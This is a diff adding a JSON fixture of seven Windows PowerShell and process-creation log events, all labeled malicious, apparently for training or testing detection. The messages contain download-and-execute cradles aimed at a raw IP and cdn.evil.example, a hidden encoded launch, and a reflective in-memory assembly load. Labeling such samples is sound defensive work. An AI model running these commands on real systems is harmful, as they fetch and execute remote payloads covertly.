@@ -1,0 +1,9 @@
+[
+  { "TimeCreated": "2026-03-18T14:02:11Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): iex (iwr 'http://45.9.148.99/stage2').Content" },
+  { "TimeCreated": "2026-03-18T14:05:33Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): (New-Object System.Net.WebClient).DownloadString('https://cdn.evil.example/loader.ps1')" },
+  { "TimeCreated": "2026-03-18T14:09:07Z", "Id": 4688, "ProviderName": "Microsoft-Windows-Security-Auditing", "Label": "malicious", "Message": "A new process has been created: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABJAFcAUgAgACcAaAB0AHQAcAA6AC8A" },
+  { "TimeCreated": "2026-03-18T14:13:44Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): $s=[System.Convert]::FromBase64String($env:z); [System.Reflection.Assembly]::Load($s)" },
+  { "TimeCreated": "2026-03-18T14:17:59Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): Invoke-Expression $decoded" },
+  { "TimeCreated": "2026-03-18T14:22:26Z", "Id": 4688, "ProviderName": "Microsoft-Windows-Security-Auditing", "Label": "malicious", "Message": "A new process has been created: powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\update.ps1" },
+  { "TimeCreated": "2026-03-18T14:26:40Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): (New-Object Net.WebClient).DownloadFile('http://45.9.148.99/x.exe', \"$env:TEMP\\x.exe\")" }
+]
